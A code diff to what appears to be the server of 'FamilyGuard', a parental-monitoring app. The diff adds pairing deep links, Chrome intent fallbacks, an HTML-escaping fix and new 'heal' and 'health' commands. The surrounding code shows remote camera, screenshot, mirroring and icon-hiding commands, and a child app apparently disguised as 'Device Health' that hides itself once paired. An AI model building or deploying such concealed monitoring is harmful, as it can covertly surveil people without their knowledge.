@@ -284,7 +284,8 @@ app.get('/api/notifications/:cid', auth, parentOnly, (req, res) => {
 const ALLOWED_ACTIONS = new Set([
   'locate_now', 'ring', 'lock', 'unlock', 'screenshot', 'camera',
   'mirror_start', 'mirror_stop', 'mirror_request_permission',
-  'show_app_icon', 'hide_app_icon', 'get_apps', 'message', 'release_protections'
+  'show_app_icon', 'hide_app_icon', 'get_apps', 'message', 'release_protections',
+  'heal', 'health' // self-heal trigger + health check (parent app & dashboard use these)
 ]);
 
 app.post('/api/commands', auth, parentOnly, (req, res) => {
@@ -475,7 +476,14 @@ app.delete('/api/apk', auth, parentOnly, (req, res) => {
   res.json({ ok: true });
 });
 
+function escHtml(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+}
+
 // Public (token-protected): browser gets a landing page, ?dl=1 streams the APK.
+// ?c=<pairing code> (added by the /s/:code setup page) shows the green
+// "open app & auto-setup" button here too, so the zero-touch loop is closed
+// even if the user loses the original QR page after installing.
 app.get('/apk/child', (req, res) => {
   const m = apkMeta();
   if (!m || !fs.existsSync(APK_FILE)) {
@@ -487,17 +495,31 @@ app.get('/apk/child', (req, res) => {
   const wantsPage = String(req.headers.accept || '').includes('text/html') && req.query.dl !== '1';
   if (wantsPage) {
     const sizeMb = (m.size / (1024 * 1024)).toFixed(1);
+    const name = escHtml(m.originalName);
+    const host = String(req.get('host') || '');
+    const origin = /^[a-zA-Z0-9.\-:\[\]]+$/.test(host)
+      ? `${String(req.get('x-forwarded-proto') || req.protocol || 'https')}://${host}` : '';
+    const code = String(req.query.c || '').trim();
+    const validCode = /^\d{6}$/.test(code) && db.children.some(x => x.pairingCode === code);
+    const deep = validCode && origin
+      ? `familyguard://pair?server=${encodeURIComponent(origin)}&code=${code}` : '';
+    const openBtn = deep
+      ? `<a class="btn green" href="${deep}">✅ App installed hai? — App kholo &amp; auto-setup</a>
+<p class="mut">Ye button app ko khud khol dega — server + code pehle se bhare honge, pair <b>khud ho jayega</b>. Pair hote hi permissions + hide bhi automatic.</p>`
+      : '';
     res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>FamilyGuard — Child App</title>
 <style>body{font-family:system-ui,sans-serif;background:#0b1220;color:#e5e7eb;display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0;padding:20px}
 .c{max-width:430px;text-align:center;background:#111a2e;padding:28px;border-radius:16px}
 .btn{display:inline-block;background:#2563eb;color:#fff;text-decoration:none;padding:14px 34px;border-radius:10px;font-size:17px;font-weight:600;margin:14px 0}
+.btn.green{background:#16a34a}
 .mut{color:#94a3b8;font-size:13px;line-height:1.6}h1{font-size:20px;margin:6px 0}</style></head>
 <body><div class="c"><div style="font-size:44px">🛡️</div><h1>FamilyGuard — Child App</h1>
-<p class="mut">${m.originalName} &middot; ${sizeMb} MB &middot; ${new Date(m.uploadedAt).toLocaleString()}</p>
-<a class="btn" href="?t=${m.shareToken}&amp;dl=1">⬇ Download APK</a>
+<p class="mut">${name} &middot; ${sizeMb} MB &middot; ${new Date(m.uploadedAt).toLocaleString()}</p>
+<a class="btn" href="?t=${m.shareToken}&amp;dl=1${validCode ? '&amp;c=' + code : ''}">⬇ Download APK</a>
+${openBtn}
 <p class="mut">Install karte waqt agar <b>"unknown apps blocked"</b> aaye to:<br><b>Settings → Allow from this source</b> enable karo → wapas aao → install.</p>
-<p class="mut">Install ke baad <b>wapas isi page par aao</b> aur green button dabao — pairing + permissions + hide SAB khud ho jayega (sirf 1 accessibility toggle ON karna hai).</p>
+<p class="mut">Install ke baad <b>green button dabao</b> — pairing + permissions + hide SAB khud ho jayega (sirf 1 accessibility toggle ON karna hai).</p>
 </div></body></html>`);
     return;
   }
@@ -518,7 +540,8 @@ app.get('/s/:code', (req, res) => {
   const proto = String(req.get('x-forwarded-proto') || req.protocol || 'https');
   const origin = `${proto}://${host}`;
   const apk = apkMeta();
-  const dl = apk ? `${origin}/apk/child?t=${apk.shareToken}` : '';
+  // dl goes into an href attribute only — use &amp; for valid HTML
+  const dl = apk ? `${origin}/apk/child?t=${apk.shareToken}&amp;c=${c.pairingCode}` : '';
   const deep = `familyguard://pair?server=${encodeURIComponent(origin)}&code=${c.pairingCode}`;
   res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>FamilyGuard — Child Setup</title>
@@ -533,15 +556,37 @@ app.get('/s/:code', (req, res) => {
 <div id="fb" style="display:none">
   ${dl ? `<a class="btn" href="${dl}">1) App download karo</a>` : ''}
   <a class="btn green" href="${deep}">2) App kholo &amp; auto-setup</a>
-  <p class="mut">Naya phone pehli baar: <b>1)</b> App download → install karo, <b>2)</b> wapas isi page par aakar green button dabao. Uske baad phone ko chhune ki zarurat nahi — pairing, permissions, hide sab apne aap.</p>
+  <p class="mut">Naya phone pehli baar: <b>1)</b> App download → install karo, <b>2)</b> wapas isi page par aakar green button dabao (ya download page ka green button). Uske baad phone ko chhune ki zarurat nahi — pairing, permissions, hide sab apne aap.</p>
   <p class="mut" style="margin-top:14px">Ya <b>Device Health</b> app kholo aur ye code daalo:</p>
   <div class="code">${c.pairingCode}</div>
   <p class="mut">Server: ${origin}</p>
 </div>
 <script>
   var link = ${JSON.stringify(deep)};
-  setTimeout(function(){ if (!document.hidden) document.getElementById('fb').style.display = 'block'; }, 1600);
-  window.location = link;
+  var isAndroid = /android/i.test(navigator.userAgent);
+  var isChrome = /chrome/i.test(navigator.userAgent) && !/edg\\//i.test(navigator.userAgent);
+  var fbUrl = location.href;
+  if (fbUrl.indexOf('fb=1') === -1) fbUrl += (fbUrl.indexOf('?') === -1 ? '?' : '&') + 'fb=1';
+  function showFb() { document.getElementById('fb').style.display = 'block'; }
+  if (!isAndroid) {
+    // Desktop/iOS: child app sirf Android par chalti hai — isi page se download/link lo
+    showFb();
+  } else if (location.search.indexOf('fb=1') !== -1) {
+    // Chrome wapas isi page par aya (app nahi mili) — ab redirect loop mat lagao
+    showFb();
+  } else if (isChrome) {
+    // intent:// + browser_fallback_url: app ho to khul jayegi, na ho to Chrome
+    // isi page par wapas aa jayega (fb=1) — ERR_UNKNOWN_URL_SCHEME error page kabhi nahi
+    var intent = link.replace('familyguard://', 'intent://') +
+      '#Intent;scheme=familyguard;package=com.familyguard.child;S.browser_fallback_url=' +
+      encodeURIComponent(fbUrl) + ';end';
+    window.location = intent;
+    setTimeout(function () { if (!document.hidden) showFb(); }, 1800);
+  } else {
+    // Baaki Android browsers: direct try + timer fallback
+    window.location = link;
+    setTimeout(function () { if (!document.hidden) showFb(); }, 1600);
+  }
 </script>
 </div></body></html>`);
 });
